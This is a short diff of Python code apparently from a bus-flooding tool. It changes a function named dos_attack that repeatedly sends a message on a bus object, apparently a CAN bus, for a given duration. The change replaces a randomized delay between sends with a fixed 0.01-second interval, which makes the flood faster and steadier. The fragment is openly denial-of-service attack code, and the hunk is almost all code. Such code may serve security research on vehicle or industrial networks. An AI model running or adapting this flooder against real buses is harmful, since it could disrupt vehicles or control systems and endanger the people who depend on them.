@@ -17,8 +17,8 @@ def dos_attack(bus, duration):
     while time.time() - start < duration:
         try:
             bus.send(msg)
-            # time.sleep(0.01)
-            time.sleep(random.uniform(0.01, 0.05))
+            time.sleep(0.01)
+            # time.sleep(random.uniform(0.01, 0.05))
             print("Sending dos message")
         except Exception as e:
             print(e)
